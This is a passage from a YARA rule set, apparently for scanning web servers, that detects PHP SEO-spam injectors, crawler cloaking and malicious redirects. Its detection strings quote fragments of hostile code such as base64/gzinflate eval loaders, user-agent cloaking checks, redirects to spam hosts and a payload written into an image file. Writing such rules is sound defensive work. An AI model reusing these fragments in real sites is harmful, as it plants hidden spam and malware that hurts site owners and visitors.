        $trigger = ".= pack('C', hexdec(substr($"
    condition:
        $trigger and PR06630
}

rule php_spamseo_injector_389 : spamseo
{
    strings:
        $trigger = "TXpCaGVpIjsNVg1WP2k="
    condition:
        $trigger and PR01350
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_391 : spamseo
{
    strings:
        $trigger = "base64_decod"
        $php_spamseo_injector_391_r0 = /strtolower\(\$_SERVER\[\"HTTP_USER_AGENT\"\]\)\)\)\{[\s]*echo base64_decode/
    condition:
        $trigger and PR01877 and $php_spamseo_injector_391_r0
}

rule php_spamseo_injector_392 : spamseo
{
    strings:
        $trigger = ".base64_decode('PHNjcmlwdD5"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_393 : spamseo
{
    strings:
        $trigger = ".base64_decode('Ow==').$"
        $php_spamseo_injector_393_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01396 and $php_spamseo_injector_393_r0
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_394 : spamseo
{
    strings:
        $trigger = "isset($_GET['txtname']) ? trim($_GET['txtname']) : '';"
        $php_spamseo_injector_394_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_spamseo_injector_394_r0
}

private rule PR06631 : trigger
{
    strings:
        $ps0 = "$body = fix_dirs($body, $folder);"
    condition:
        $ps0
}

rule php_spamseo_injector_gen_029 : spamseo
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR06631
}

rule php_spamseo_injector_gen_030 : spamseo
{
    strings:
        $trigger = "_*\") as $ff){unlink($ff);}"
    condition:
        $trigger and PR01431
}

private rule PR06632 : trigger
{
    strings:
        $ps0 = "txt'); echo $file['0']; ?>"
    condition:
        $ps0
}

rule php_spamseo_injector_gen_035 : spamseo
{
    strings:
        $trigger = "<?php $file=file"
    condition:
        $trigger and PR06632
}

private rule PR06633 : trigger
{
    strings:
        $ps0 = "echo trim($u[\"$index\"]);"
    condition:
        $ps0
}

rule php_spamseo_injector_gen_036 : spamseo
{
    strings:
        $trigger = "CURL"
    condition:
        $trigger and PR06633 and PR01553
}

private rule PR06634 : trigger
{
    strings:
        $ps0 = "$xxx = fwrite($xx"
    condition:
        $ps0
}

rule php_spamseo_injector_gen_042 : spamseo
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR02062 and PR06634
}

rule php_spamseo_injector_gen_042_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01392 and PR06634 and PR00357
}

private rule PR06635 : trigger
{
    strings:
        $ps0 = "bot|spider|wget/i',$_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

rule php_spamseo_injector_gen_043 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02155 and PR06635
}

private rule PR06636 : trigger
{
    strings:
        $ps0 = "$tmp,1);}else{ break;}"
    condition:
        $ps0
}

rule php_spamseo_injector_gen_044 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR04024 and PR06636
}

rule php_spamseo_injector_group_001 : spamseo
{
    strings:
        $trigger = "fail_reason('Success!"
    condition:
        $trigger and PR00203
}

private rule PR06637 : trigger
{
    strings:
        $ps0 = "|| strpos($fromurl, 'yahoo.co.jp') !== false || strpos($fromurl, 'localhost')"
    condition:
        $ps0
}

rule php_spamseo_japanesespam_001 : spamseo
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR06637
}

private rule PR06638 : trigger
{
    strings:
        $ps0 = "<title>&#12523;&#12452;&#12532;&#12451;&#12488;&#12531;&#38263;&#36001;&#24067;,&#12532;"
    condition:
        $ps0
}

rule php_spamseo_japanesespam_002 : spamseo
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR06638
}

private rule PR06639 : trigger
{
    strings:
        $ps0 = "echo $urls0.$siteurl.'index.php?"
    condition:
        $ps0
}

rule php_spamseo_japanesespam_003 : spamseo
{
    strings:
        $trigger = "<div style=\"display:none;\"></div><iframe "
    condition:
        $trigger and PR06639
}

private rule PR06640 : trigger
{
    strings:
        $ps0 = "google|youdao|yahoo|bing|118114|"
    condition:
        $ps0
}

rule php_spamseo_japanesespam_004 : spamseo
{
    strings:
        $trigger = "<div style=\"display:none;\"></div><iframe "
    condition:
        $trigger and PR06640
}

private rule PR06641 : trigger
{
    strings:
        $ps0 = "2015 Nikkei Business Publications, Inc. All Rights Reserved.</div>"
    condition:
        $ps0
}

rule php_spamseo_japanesespam_005 : spamseo
{
    strings:
        $trigger = ".com"
    condition:
        $trigger and PR06641
}

private rule PR06642 : trigger
{
    strings:
        $ps0 = "if((strpos($agent,'bot') > 0 || $aaip ==1)"
    condition:
        $ps0
}

rule php_spamseo_japanesespam_006 : spamseo
{
    strings:
        $trigger = "strpos($all,\"ja\")>-1 && (strpos($s_ref,\"jp\")>0"
    condition:
        $trigger and PR06642 and PR02741
}

private rule PR06643 : trigger
{
    strings:
        $ps0 = "$rsa='af(!defahed(\"nums\"))"
    condition:
        $ps0
}

rule php_spamseo_jmodule_injector_001 : spamseo
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR06643
}

rule php_spamseo_Joomlainjector_003 : spamseo
{
    strings:
        $trigger = "include_once JPATH_LIBRARIES.'/joomla/base/init.php';"
    condition:
        $trigger
}

private rule PR06644 : trigger
{
    strings:
        $ps0 = "$zzj='$eleael = tnt_gei("
    condition:
        $ps0
}

rule php_spamseo_joomlapharma_001 : spamseo
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR06644
}

rule php_spamseo_joomlapharma_002 : spamseo
{
    strings:
        $trigger = "$link=gzinflate(base64_decode(file_get_contents($path.\"/libraries/joomla/environment/\""
    condition:
        $trigger
}

private rule PR06645 : trigger
{
    strings:
        $ps0 = "= html_x_http_request("
    condition:
        $ps0
}

rule php_spamseo_jplist_001 : spamseo
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR06645
}

private rule PR06646 : trigger
{
    strings:
        $ps0 = "$linksplit = trim($_REQUEST[\"LinkSplit\"]);"
    condition:
        $ps0
}

rule php_spamseo_jplist_002 : spamseo
{
    strings:
        $trigger = "header("
    condition:
        $trigger and PR06646
}

private rule PR06647 : trigger
{
    strings:
        $ps0 = "  echo '"
    condition:
        $ps0
}

rule php_spamseo_link_cloaking_001 : spamseo
{
    strings:
        $trigger = "if(stristr($agent,'google') || stristr($agent,'bing') || stristr($agent,'yahoo') || stristr($agent,'aol')) {"
    condition:
        $trigger and PR06647
}

private rule PR06648 : trigger
{
    strings:
        $ps0 = "if(empty($CLOAKING["
    condition:
        $ps0
}

rule php_spamseo_link_cloaking_002 : spamseo
{
    strings:
        $trigger = "cloakedCurl"
    condition:
        $trigger and PR01553 and PR01401 and PR06648
}

rule php_spamseo_link_injector_001 : spamseo
{
    strings:
        $trigger = "$fptest = fopen(\"wp-content/jspx.php\", \"w\");"
    condition:
        $trigger and PR01458
}

private rule PR06649 : trigger
{
    strings:
        $ps0 = "link .= '<li><a href=\"http://'"
    condition:
        $ps0
}

private rule PR06650 : trigger
{
    strings:
        $ps0 = "function isCrawler()"
    condition:
        $ps0
}

rule php_spamseo_link_injector_002 : spamseo
{
    strings:
        $trigger = "function getlinks($arrUrl,$links)"
    condition:
        $trigger and PR06649 and PR01401 and PR06650
}

private rule PR06651 : trigger
{
    strings:
        $ps0 = "viagra"
    condition:
        $ps0
}

private rule PR06652 : trigger
{
    strings:
        $ps0 = "</a>';?>"
    condition:
        $ps0
}

rule php_spamseo_link_injector_003 : spamseo
{
    strings:
        $trigger = "<?php echo '<a href=\"http://"
    condition:
        $trigger and PR06651 and PR06652
}

rule php_spamseo_link_injector_004 : spamseo
{
    strings:
        $trigger = "preg_replace(\"~(</body>)~i\", \"{$this->js}\\r\\n{$tracker_code"
    condition:
        $trigger and PR01351
}

private rule PR06653 : trigger
{
    strings:
        $ps0 = "</a> &nbsp;"
    condition:
        $ps0
}

private rule PR06654 : trigger
{
    strings:
        $ps0 = "google') !== false || strpos"
    condition:
        $ps0
}

rule php_spamseo_link_injector_005 : spamseo
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR00540 and PR06653 and PR06654
}

rule php_spamseo_link_injector_006 : spamseo
{
    strings:
        $trigger = "if(preg_match('/' . implode('|', $uagents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {"
    condition:
        $trigger
}

private rule PR06655 : trigger
{
    strings:
        $ps0 = "preg_replace(\"(<a href=\\\"[^>]*\\?)\",\"<a href=\\\"?\",$"
    condition:
        $ps0
}

rule php_spamseo_link_injector_007 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06655 and PR01431
}

private rule PR06656 : trigger
{
    strings:
        $ps0 = "if ( is_front_page() ) { echo ' <p hidden>"
    condition:
        $ps0
}

rule php_spamseo_link_injector_008 : spamseo
{
    strings:
        $trigger = "style"
    condition:
        $trigger and PR06656
}

rule php_spamseo_link_injector_009 : spamseo
{
    strings:
        $trigger = ".$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] .'QQQ'. $_SERVER['HTTP_USER_AGENT'].'QQQEND',false,$"
    condition:
        $trigger and PR00070
}

private rule PR06657 : trigger
{
    strings:
        $ps0 = "['post_content'] ="
    condition:
        $ps0
}

rule php_spamseo_link_injector_010 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR06657 and PR00357
}

rule php_spamseo_link_injector_011 : spamseo
{
    strings:
        $trigger = "/i',$_SERVER['HTTP_USER_AGENT'])){ ?>"
    condition:
        $trigger
}

private rule PR06658 : trigger
{
    strings:
        $ps0 = "eyJsaWNlbnNlIjoiY3JlYXRlX2Z1bmN0aW9uIiwiYWNjb3VudCI6IiR4IiwidGhlbWUiOiJ"
    condition:
        $ps0
}

rule php_spamseo_link_injector_012 : spamseo
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR06658 and PR04124
}

private rule PR06659 : trigger
{
    strings:
        $ps0 = "is_single() && ! is_user_logged_in() && ! is_feed() && ! stristr( $_SERVER["
    condition:
        $ps0
}

private rule PR06660 : trigger
{
    strings:
        $ps0 = "$fullcontent = $content;"
    condition:
        $ps0
}

rule php_spamseo_link_injector_014 : spamseo
{
    strings:
        $trigger = "add_filter("
    condition:
        $trigger and PR06659 and PR06660 and PR05051
}

private rule PR06661 : trigger
{
    strings:
        $ps0 = "$enc1 = strpos($keyStr,"
    condition:
        $ps0
}

rule php_spamseo_link_injector_014_02 : spamseo
{
    strings:
        $trigger = "add_filter("
    condition:
        $trigger and PR00091 and PR06660 and PR05051 and PR06661
}

private rule PR06662 : trigger
{
    strings:
        $ps0 = "echo '<div style=\"margin-left: 10px; text-align: center; font-size: 10px; color: #999999;\">';"
    condition:
        $ps0
}

rule php_spamseo_link_injector_015 : spamseo
{
    strings:
        $trigger = "target=\"_blank\""
    condition:
        $trigger and PR06662
}

private rule PR06663 : trigger
{
    strings:
        $ps0 = "echo ($basefile("
    condition:
        $ps0
}

rule php_spamseo_link_injector_016 : spamseo
{
    strings:
        $trigger = "128/2"
    condition:
        $trigger and PR00091 and PR06663 and PR05051
}

private rule PR06664 : trigger
{
    strings:
        $ps0 = "'ba'.'se'. 32*2 .'_' .'de'.'co'.'de';"
    condition:
        $ps0
}

private rule PR06665 : trigger
{
    strings:
        $ps0 = "PGRpdiBjbGFzcz0iaG0iPiA8YSBocmVmPSJodHRwOi8vaXN0YW5idWxlc2NvcnRhZ2VuY3kuY29tIiB"
    condition:
        $ps0
}

rule php_spamseo_link_injector_017 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06664 and PR06665
}

// MANUAL FIX NECESSARY
rule php_spamseo_link_injector_017_02 : spamseo
{
    strings:
        $trigger = "echo"
        $php_spamseo_link_injector_017_02_r0 = /function \s*\w+\(\)\{\s*if\s*\(isset\(\$_SERVER\[.HTTP_USER_AGENT.\]\)\s*\&\&\s*preg_match.\\".Googleb[^\}]*=\";\s*echo\s*\$\w+/
    condition:
        $trigger and PR06612 and PR06665 and $php_spamseo_link_injector_017_02_r0
}

rule php_spamseo_link_injector_018 : spamseo
{
    strings:
        $trigger = "(preg_match(\"#('|\\\")(http"
    condition:
        $trigger and PR04124 and PR02092
}

rule php_spamseo_LinkMaster_001 : spamseo
{
    strings:
        $trigger = "echo str_replace('LinkMaster"
    condition:
        $trigger
}

rule php_spamseo_linksdonor_001 : spamseo
{
    strings:
        $trigger = "links.php?d=$donor\";"
    condition:
        $trigger and PR00287
}

rule php_spamseo_linksdonor_002 : spamseo
{
    strings:
        $trigger = "if ($vyborka = file(\"cache/$donor\"))"
    condition:
        $trigger and PR01362
}

rule php_spamseo_linksdonor_003 : spamseo
{
    strings:
        $trigger = "print('<a href=\"'.myurls().'\">'.get_anchor"
    condition:
        $trigger
}

rule php_spamseo_links_cache_xml_001 : spamseo
{
    strings:
        $trigger = "getLinks('on',$LinksDataForXmlCache[links]"
    condition:
        $trigger and PR00091
}

rule php_spamseo_linksuite_001 : spamseo
{
    strings:
        $trigger = "class LLM_client extends LLM_base {"
    condition:
        $trigger and PR02803
}

private rule PR06666 : trigger
{
    strings:
        $ps0 = "$af(~$b6d("
    condition:
        $ps0
}

rule php_spamseo_linkwithin_001 : spamseo
{
    strings:
        $trigger = "_option"
    condition:
        $trigger and PR06666
}

rule php_spamseo_magentoinjector_001 : spamseo
{
    strings:
        $trigger = "@include_once BP . DS . 'app' . DS . 'etc' ."
    condition:
        $trigger
}

private rule PR06667 : trigger
{
    strings:
        $ps0 = "class MLClient"
    condition:
        $ps0
}

rule php_spamseo_mainlinks_ru_002 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06667
}

private rule PR06668 : trigger
{
    strings:
        $ps0 = "$linker = str_replace('<replace>', $param, $linker"
    condition:
        $ps0
}

private rule PR06669 : trigger
{
    strings:
        $ps0 = "$linker = base64_decode(\""
    condition:
        $ps0
}

rule php_spamseo_modxinjector_001 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06668 and PR06669
}

private rule PR06670 : trigger
{
    strings:
        $ps0 = "file_put_contents(MODX_CORE_PATH . \"/model/modx/smarty/logo.png\", base64_decode($_"
    condition:
        $ps0
}

rule php_spamseo_modxinjector_002 : spamseo
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR06670
}

private rule PR06671 : trigger
{
    strings:
        $ps0 = ".xyz\" target=\"_blank\" style=\"color: "
    condition:
        $ps0
}

rule php_spamseo_movies2watch_xyz_001 : spamseo
{
    strings:
        $trigger = "<a href=\"http://movies2watch.xyz\" "
    condition:
        $trigger and PR06671
}

private rule PR06672 : trigger
{
    strings:
        $ps0 = "<iframe src=\"http://movies2watch.xyz"
    condition:
        $ps0
}

rule php_spamseo_movies2watch_xyz_002 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR06672 and PR06671
}

private rule PR06673 : trigger
{
    strings:
        $ps0 = "gma_styles"
    condition:
        $ps0
}

private rule PR06674 : trigger
{
    strings:
        $ps0 = "aHR0cDovL2Nkbi5nb21hZmlhLmNvbQ=="
    condition:
        $ps0
}

rule php_spamseo_nulled_by_gomafia_001 : spamseo
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR06673 and PR06674
}

private rule PR06675 : trigger
{
    strings:
        $ps0 = "echo @file_get_contents(base64_decode(\"aHR0cDovL"
    condition:
        $ps0
}

rule php_spamseo_nulled_by_gomafia_002 : spamseo
{
    strings:
        $trigger = "aHR0cDovL2Nkbi5nb21hZmlhLmNvbQ=="
    condition:
        $trigger and PR06675
}

private rule PR06676 : trigger
{
    strings:
        $ps0 = "function callbackx($buffer) {$tx=\"\";if (function_exists(\"is_user_logged_in"
    condition:
        $ps0
}

rule php_spamseo_payday_loans_002 : spamseo
{
    strings:
        $trigger = "str_"
    condition:
        $trigger and PR06676
}

rule php_spamseo_pornspam_001 : spamseo
{
    strings:
        $trigger = "header(\"LOCATION: http://185.36.100.210/"
    condition:
        $trigger
}

rule php_spamseo_pornspam_002 : spamseo
{
    strings:
        $trigger = "$dw = str_replace(\"##RATING_COUNT##\", $rating_count, $dw);"
    condition:
        $trigger and PR00091
}

private rule PR06677 : trigger
{
    strings:
        $ps0 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>FREE PORN"
    condition:
        $ps0
}

rule php_spamseo_pornspam_003 : spamseo
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR06677
}

rule php_spamseo_pornspam_004 : spamseo
{
    strings:
        $trigger = "$countNesting = strlen($url) % 2;"
    condition:
        $trigger and PR00091
}

private rule PR06678 : trigger
{
    strings:
        $ps0 = "echo $wp_post_get_pwdcontent;"
    condition:
        $ps0
}

rule php_spamseo_pornspam_005 : spamseo
{
    strings:
        $trigger = "CURLOPT_URL, base64_decode(\""
    condition:
        $trigger and PR06678
}

private rule PR06679 : trigger
{
    strings:
        $ps0 = "if (filter_var(RC4::Decrypt($key, $val), FILTER_VALIDATE_EMAIL)"
    condition:
        $ps0
}

rule php_spamseo_pornspam_006 : spamseo
{
    strings:
        $trigger = ".$_SERVER['HTTP_REFERER'].\"\\n\",  FILE_APPEND"
    condition:
        $trigger and PR06679 and PR00273
}

rule php_spamseo_pornspam_007 : spamseo
{
    strings:
        $trigger = "alert('Install downloaded porn player for watching videos!"
    condition:
        $trigger and PR00371
}

private rule PR06680 : trigger
{
    strings:
        $ps0 = "if ($_SERVER['REQUEST_URI']=='/'){?><div style=\"position:"
    condition:
        $ps0
}

rule php_spamseo_pornspam_008 : spamseo
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR06680
}

private rule PR06681 : trigger
{
    strings:
        $ps0 = "pstMtd"
    condition:
        $ps0
}

rule php_spamseo_pstmtdredirect_001 : spamseo
{
    strings:
        $trigger = "google.com\")){wp_redirect(base64_decode("
    condition:
        $trigger and PR00091 and PR06681
}

rule php_spamseo_randomredirect_001 : spamseo
{
    strings:
        $trigger = "$URL = $urls[rand(0, count($urls) - 1)].rand(11, 999);"
    condition:
        $trigger
}

rule php_spamseo_redirect_001 : spamseo
{
    strings:
        $trigger = "add_action( 'template_redirect','pagegood');"
    condition:
        $trigger
}

private rule PR06682 : trigger
{
    strings:
        $ps0 = "if($_GET['mode']=='config'){echo"
    condition:
        $ps0
}

rule php_spamseo_redirect_001_020 : spamseo
{
    strings:
        $trigger = "Location:"
    condition:
        $trigger and PR06682
}

private rule PR06683 : trigger
{
    strings:
        $ps0 = "$location = \"http://best-canadian-pills.rx-medical.com"
    condition:
        $ps0
}

rule php_spamseo_redirect_001_021 : spamseo
{
    strings:
        $trigger = "Location:"
    condition:
        $trigger and PR06683
}

private rule PR06684 : trigger
{
    strings:
        $ps0 = "$settings['url']=file_get_contents($geturl);"
    condition:
        $ps0
}

rule php_spamseo_redirect_001_022 : spamseo
{
    strings:
        $trigger = "Location:"
    condition:
        $trigger and PR06684
}

// MANUAL FIX NECESSARY
private rule PR06685 : trigger
{
    strings:
        $ps0 = "urls)"
    condition:
        $ps0
}

private rule PR06686 : trigger
{
    strings:
        $ps0 = "[$n]"
    condition:
        $ps0
}

rule php_spamseo_redirect_002 : spamseo
{
    strings:
        $trigger = "mt_rand(0,count($"
        $php_spamseo_redirect_002_r0 = /<\?php[\s]*(\$[\w]+[\s]*=[\s]*strpos\(\$_SERVER\[.HTTP_USER_AGENT[^;]+;[\s]*)?\$[\w]*urls[\s]*=[\s]*array[\s]*\([\s]*.http/
    condition:
        $trigger and PR06685 and PR06686 and $php_spamseo_redirect_002_r0
}

// MANUAL FIX NECESSARY
rule php_spamseo_redirect_002_02 : spamseo
{
    strings:
        $trigger = "url"
        $php_spamseo_redirect_002_02_r0 = /<meta http-equiv[\s]*=[\s]*.refresh.[\s]*content[\s]*=[\s]*.[\d]+;[\s]*url[\s]*=[\s]*<\?php[\s]*echo[\s]*\$target_url;[\s]*\?>/
    condition:
        $trigger and $php_spamseo_redirect_002_02_r0
}

rule php_spamseo_redirect_002_03 : spamseo
{
    strings:
        $trigger = "$rnd=rand(0,count($urls)-1);"
    condition:
        $trigger
}

rule php_spamseo_redirect_003 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pVj"
    condition:
        $trigger
}

private rule PR06687 : trigger
{
    strings:
        $ps0 = "@$_(\"eva"
    condition:
        $ps0
}

rule php_spamseo_redirect_003_02 : spamseo
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR06687
}

private rule PR06688 : trigger
{
    strings:
        $ps0 = "@$_(\""
    condition:
        $ps0
}

rule php_spamseo_redirect_003_03 : spamseo
{
    strings:
        $trigger = "$_ = strrev(\"tress"
    condition:
        $trigger and PR06688
}

rule php_spamseo_redirect_003_04 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('rRhrc5"
    condition:
        $trigger
}

rule php_spamseo_redirect_004 : spamseo
{
    strings:
        $trigger = "eval(base64_decode(\"DQ"
    condition:
        $trigger
}

rule php_spamseo_redirect_005 : spamseo
{
    strings:
        $trigger = "define('ADMIN_REDIR_URL',"
    condition:
        $trigger
}

rule php_spamseo_redirect_007 : spamseo
{
    strings:
        $trigger = "php error_reporting(0);$a=str_split($password.'2','3"
    condition:
        $trigger
}

private rule PR06689 : trigger
{
    strings:
        $ps0 = "(strpos($useragent"
    condition:
        $ps0
}

rule php_spamseo_redirect_008 : spamseo
{
    strings:
        $trigger = "function get_naps_bot()"
    condition:
        $trigger and PR06689
}

rule php_spamseo_redirect_009 : spamseo
{
    strings:
        $trigger = "$url = \"www.randomwebsite.com/cgi-bin/random.pl?$url\";"
    condition:
        $trigger
}

rule php_spamseo_redirect_010 : spamseo
{
    strings:
        $trigger = "echo file_get_contents('1x1.gif',FILE_BINARY);"
    condition:
        $trigger
}

rule php_spamseo_redirect_011 : spamseo
{
    strings:
        $trigger = "i', $uniq_ref) > 0)||(stristr($uniq_ref,\"google\")))  {header"
    condition:
        $trigger
}

rule php_spamseo_redirect_012 : spamseo
{
    strings:
        $trigger = "if (!file_exists('redirect.url') || time() - filemtime('redirect.url') > 60)"
    condition:
        $trigger
}

rule php_spamseo_redirect_013 : spamseo
{
    strings:
        $trigger = "bOdWQkNnHHvxX0TqPhfTHt9kdnFuZdi8c464HpzXzhalY7iW3IwWnA57YJrelK8XFrYynFRnGombku7d8wwaZWtrECRRwMPvMoyffFZNejQnz01I92DurhRRRWpYUUUUAFFFe1"
    condition:
        $trigger and PR04816
}

rule php_spamseo_redirect_014 : spamseo
{
    strings:
        $trigger = "aHR0cDovL3Byb21vY2FzaW5vLnJ1Lw=="
    condition:
        $trigger and PR00732
}

private rule PR06690 : trigger
{
    strings:
        $ps0 = "$baidufromsite=\"http:"
    condition:
        $ps0
}

rule php_spamseo_redirect_015 : spamseo
{
    strings:
        $trigger = "ror_reporting"
    condition:
        $trigger and PR06690
}

rule php_spamseo_redirect_016 : spamseo
{
    strings:
        $trigger = "<script src=\"http://redirect.lifax."
    condition:
        $trigger
}

rule php_spamseo_redirect_029 : spamseo
{
    strings:
        $trigger = "$url = ( preg_match('/^[a-z2-7]+$/', $_SERVER['QUERY_STRING'])"
    condition:
        $trigger
}

rule php_spamseo_redirect_030 : spamseo
{
    strings:
        $trigger = "$getbot = Getbot();"
    condition:
        $trigger
}

private rule PR06691 : trigger
{
    strings:
        $ps0 = "fucksure"
    condition:
        $ps0
}

rule php_spamseo_redirect_030_002 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06691
}

private rule PR06692 : trigger
{
    strings:
        $ps0 = "Header('Location: '.$li);"
    condition:
        $ps0
}

rule php_spamseo_redirect_031 : spamseo
{
    strings:
        $trigger = "$lin=$_GET[\"link\"];"
    condition:
        $trigger and PR06692
}

rule php_spamseo_redirect_032 : spamseo
{
    strings:
        $trigger = "|^your.*|^zeto.*|^ZTE.*/i', $useragent)) {"
    condition:
        $trigger
}

private rule PR06693 : trigger
{
    strings:
        $ps0 = "if(stripos($_SERVER['HTTP_USER_AGENT']"
    condition:
        $ps0
}

rule php_spamseo_redirect_033 : spamseo
{
    strings:
        $trigger = "\".trim($_GET['uu']).\".html\");"
    condition:
        $trigger and PR06693
}

rule php_spamseo_redirect_034 : spamseo
{
    strings:
        $trigger = "$arrquery[1],file_get_contents('http://'.$sites.'/search.php?'.$arrquery[0])));"
    condition:
        $trigger
}

rule php_spamseo_redirect_035 : spamseo
{
    strings:
        $trigger = "Header('Location: http://bit.ly"
    condition:
        $trigger and PR00080
}

private rule PR06694 : trigger
{
    strings:
        $ps0 = "echo \"self.location='https://www.google.com"
    condition:
        $ps0
}

rule php_spamseo_redirect_036 : spamseo
{
    strings:
        $trigger = "echo \"if(s.indexOf('bing')>0||s.indexOf('aol')>0||s.indexOf('google"
    condition:
        $trigger and PR06694 and PR00080
}

rule php_spamseo_redirect_037 : spamseo
{
    strings:
        $trigger = "$url_parse = explode($article_url_parse, $_SERVER[ 'REQUEST_URI' ]);"
    condition:
        $trigger and PR01746
}

rule php_spamseo_redirect_038 : spamseo
{
    strings:
        $trigger = "else if ($isJa && !$isoldpage){"
    condition:
        $trigger and PR01746
}

private rule PR06695 : trigger
{
    strings:
        $ps0 = "<?if($_SERVER['HTTP_USER_AGENT'] =="
    condition:
        $ps0
}

private rule PR06696 : trigger
{
    strings:
        $ps0 = "<?}else{?>"
    condition:
        $ps0
}

rule php_spamseo_redirect_039 : spamseo
{
    strings:
        $trigger = "window.location=\"http://my.mail.ru/\""
    condition:
        $trigger and PR06695 and PR06696
}

private rule PR06697 : trigger
{
    strings:
        $ps0 = "print <<< EOF"
    condition:
        $ps0
}

rule php_spamseo_redirect_040 : spamseo
{
    strings:
        $trigger = "<script>window.location = \""
    condition:
        $trigger and PR06697 and PR01799
}

rule php_spamseo_redirect_041 : spamseo
{
    strings:
        $trigger = "window.opener.location.replace('$login_scam_page_link"
    condition:
        $trigger and PR00371
}

private rule PR06698 : trigger
{
    strings:
        $ps0 = "function check_cookie($url_redirect)"
    condition:
        $ps0
}

rule php_spamseo_redirect_042 : spamseo
{
    strings:
        $trigger = "check_cookie($another_mobile_redirect);"
    condition:
        $trigger and PR06698 and PR00080
}

rule php_spamseo_redirect_043 : spamseo
{
    strings:
        $trigger = "define(\"FRH_TOTAL\", count($scams));"
    condition:
        $trigger and PR00092
}

private rule PR06699 : trigger
{
    strings:
        $ps0 = "$productId = preg_replace('/[^\\d]/', '',$QUERYSTRING);"
    condition:
        $ps0
}

rule php_spamseo_redirect_044 : spamseo
{
    strings:
        $trigger = "header('location: http://'.$sites.'/index.php?main_page=product_info&products_id='.$productId);exit;"
    condition:
        $trigger and PR06699
}

private rule PR06700 : trigger
{
    strings:
        $ps0 = "$wp_did_header"
    condition:
        $ps0
}

rule php_spamseo_redirect_045 : spamseo
{
    strings:
        $trigger = "if(strtolower($URIRedirect)==\"/index.php\")"
    condition:
        $trigger and PR06700 and PR00538
}

private rule PR06701 : trigger
{
    strings:
        $ps0 = "header('Location: http://bilgialma.co"
    condition:
        $ps0
}

rule php_spamseo_redirect_045_03 : spamseo
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR06701
}

private rule PR06702 : trigger
{
    strings:
        $ps0 = "$xml = @simplexml_load_file(\"http:"
    condition:
        $ps0
}

private rule PR06703 : trigger
{
    strings:
        $ps0 = "?> <meta http-equiv=\"refresh\" content=\"0; url="
    condition:
        $ps0
}

rule php_spamseo_redirect_046 : spamseo
{
    strings:
        $trigger = "if (!session_id()){session_start(); ob_start();}  if (!preg_match('/facebookexternalhit"
    condition:
        $trigger and PR06702 and PR06703
}

private rule PR06704 : trigger
{
    strings:
        $ps0 = "$replace_routes = array("
    condition:
        $ps0
}

rule php_spamseo_redirect_047 : spamseo
{
    strings:
        $trigger = "\\x72\\x65\\x66\\x65\\x72\\x72\\x65\\x72"
    condition:
        $trigger and PR06704
}

private rule PR06705 : trigger
{
    strings:
        $ps0 = "$raw = base64_decode($encoded);"
    condition:
        $ps0
}

rule php_spamseo_redirect_049 : spamseo
{
    strings:
        $trigger = "$res .= chr(ord($raw[$i]) ^ ord('x'));"
    condition:
        $trigger and PR06705
}

private rule PR06706 : trigger
{
    strings:
        $ps0 = "php?\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"REQUEST_URI\"]);"
    condition:
        $ps0
}

rule php_spamseo_redirect_050 : spamseo
{
    strings:
        $trigger = "i',@$_SERVER[\"HTTP_REFERER\"])) {"
    condition:
        $trigger and PR06706 and PR02741
}

rule php_spamseo_redirect_051 : spamseo
{
    strings:
        $trigger = "if (wordsFound(preg_quote(urldecode($referer"
    condition:
        $trigger and PR00538
}

private rule PR06707 : trigger
{
    strings:
        $ps0 = "if(strpos($tmp, 'bot') == false){"
    condition:
        $ps0
}

private rule PR06708 : trigger
{
    strings:
        $ps0 = "header(\"Location: \" . $oursite . $_SERVER[\"QUERY_STRING\"]);"
    condition:
        $ps0
}

rule php_spamseo_redirect_052 : spamseo
{
    strings:
        $trigger = "$content=gethttpcnt($website.stripslashes($_SERVER['QUERY_STRING']));"
    condition:
        $trigger and PR06707 and PR06708
}

private rule PR06709 : trigger
{
    strings:
        $ps0 = "api.php?apitoken="
    condition:
        $ps0
}

rule php_spamseo_redirect_053 : spamseo
{
    strings:
        $trigger = "<?php header('Location:"
    condition:
        $trigger and PR06709 and PR00070
}

private rule PR06710 : trigger
{
    strings:
        $ps0 = "document.cookie"
    condition:
        $ps0
}

rule php_spamseo_redirect_054 : spamseo
{
    strings:
        $trigger = "authtoken=1; path=/;expires="
    condition:
